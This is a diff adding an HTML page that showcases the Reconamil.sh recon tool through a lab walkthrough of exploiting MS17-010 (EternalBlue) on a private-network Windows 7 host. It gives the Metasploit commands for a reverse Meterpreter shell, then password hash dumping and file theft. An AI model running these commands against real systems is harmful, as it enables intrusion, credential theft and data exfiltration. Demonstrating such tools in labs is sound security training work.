@@ -1,0 +1,122 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🚀 Reconamil.sh — Real-World Use Case & Exploitation Walkthrough</title>
+<style>
+    body { font-family: "Segoe UI", Tahoma, sans-serif; background: #f4f6f8; color: #333; margin: 0; }
+    header { background: linear-gradient(90deg, #004aad, #0084ff); color: white; padding: 20px; text-align: center; }
+    main { max-width: 950px; margin: 30px auto; background: white; border-radius: 8px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+    h1, h2, h3 { color: #004aad; }
+    p { line-height: 1.7; }
+    code { background: #eee; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; }
+    pre { background: #1e1e1e; color: #e0e0e0; padding: 14px; border-radius: 6px; overflow-x: auto; margin: 15px 0; }
+    section { margin-bottom: 40px; }
+    ul { margin: 0 0 0 20px; }
+    footer { text-align: center; color: #777; font-size: 14px; padding: 20px; }
+</style>
+</head>
+<body>
+<header>
+    <h1>🛡️ Reconamil.sh</h1>
+    <p>Real-World Bug Bounty / Pentest Example: Recon → Exploit → Report</p>
+</header>
+<main>
+
+<section>
+    <h2>📌 Objective</h2>
+    <p>Showcase how <strong>Reconamil.sh</strong> can automate reconnaissance, enumeration, scanning, and assist in exploitation & reporting on a vulnerable Windows target.</p>
+</section>
+
+<section>
+    <h2>🔍 Step 1: Recon & Scanning</h2>
+    <p>Cloned & executed <code>Reconamil.sh</code> to discover live hosts, open ports, and known vulnerabilities:</p>
+    <pre>git clone https://github.com/ravisairockey/Recon-Racket
+cd Recon-Racket
+chmod +x ReconAmil.sh
+./ReconAmil.sh -t 192.168.2.134 -r -p "1-1000"</pre>
+
+    <p><strong>Output highlights:</strong></p>
+    <ul>
+        <li>Nmap discovered SMB port 445 open on <code>192.168.2.134</code> (Windows 7 Ultimate SP1)</li>
+        <li>Recon mode ran <code>subfinder</code> & <code>amass</code> (found subdomains, if applicable)</li>
+        <li><code>nikto</code> & <code>wpscan</code> checked for web vuln (if HTTP services found)</li>
+    </ul>
+</section>
+
+<section>
+    <h2>🧭 Step 2: Enumeration & Vulnerability Check</h2>
+    <p>Used Nmap NSE to confirm <strong>MS17-010 / EternalBlue</strong> vulnerability:</p>
+    <pre>nmap -p445 --script smb-vuln-ms17-010 192.168.2.134</pre>
+    <p>Result: Target is <strong>VULNERABLE</strong> to EternalBlue!</p>
+</section>
+
+<section>
+    <h2>⚙️ Step 3: Exploitation with Metasploit</h2>
+    <p>Used the <code>exploit/windows/smb/ms17_010_eternalblue</code> module:</p>
+    <pre>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.2.134
+set LHOST 192.168.2.131
+set LPORT 4444
+exploit</pre>
+
+    <p><strong>Success:</strong> Meterpreter session gained with SYSTEM privileges:</p>
+    <pre>meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+OS: Windows 7 (Build 7601, Service Pack 1)</pre>
+</section>
+
+<section>
+    <h2>🛠 Step 4: Post-Exploitation</h2>
+    <p>Captured data & maintained persistence (for demonstration):</p>
+    <pre>meterpreter > ps
+meterpreter > hashdump
+meterpreter > screenshot
+meterpreter > download C:\Users\Administrator\Desktop\secret.docx</pre>
+</section>
+
+<section>
+    <h2>📊 HTML Report Generated</h2>
+    <p><code>Reconamil.sh</code> auto-created HTML & text logs, e.g.:</p>
+    <ul>
+        <li><code>logs/scan_2025-07-07_04-46-36.txt</code></li>
+        <li><code>logs/report_2025-07-07_04-46-36.html</code></li>
+    </ul>
+    <p>Reports include: Nmap results, recon logs, vulnerability findings, and screenshots of the scan.</p>
+</section>
+
+<section>
+    <h2>🚀 Why is this powerful?</h2>
+    <ul>
+        <li>📌 Fast enumeration & scanning</li>
+        <li>🔍 Confirms real vulnerabilities</li>
+        <li>⚡ Guides you right to exploitation (Metasploit, custom scripts)</li>
+        <li>📑 Auto-generates professional logs & reports</li>
+        <li>🛠 Easy to extend: ffuf, gobuster, nuclei, SMBMap, ftp enum & more</li>
+    </ul>
+</section>
+
+<section>
+    <h2>✅ Conclusion</h2>
+    <p>With <strong>Reconamil.sh</strong> and a few exploitation tools, we:
+        <ul>
+            <li>Discovered a vulnerable host</li>
+            <li>Confirmed MS17-010 vuln</li>
+            <li>Exploited successfully</li>
+            <li>Documented all steps in HTML report</li>
+        </ul>
+        A fast, modular framework for bug bounty, pentesting, & learning.
+    </p>
+</section>
+
+<footer>
+    Made with ❤️ by <strong>@AmilRSV</strong> — <a href="https://github.com/ravisairockey/Recon-Racket" target="_blank">Project Repo</a>
+</footer>
+
+</main>
+</body>
+</html>
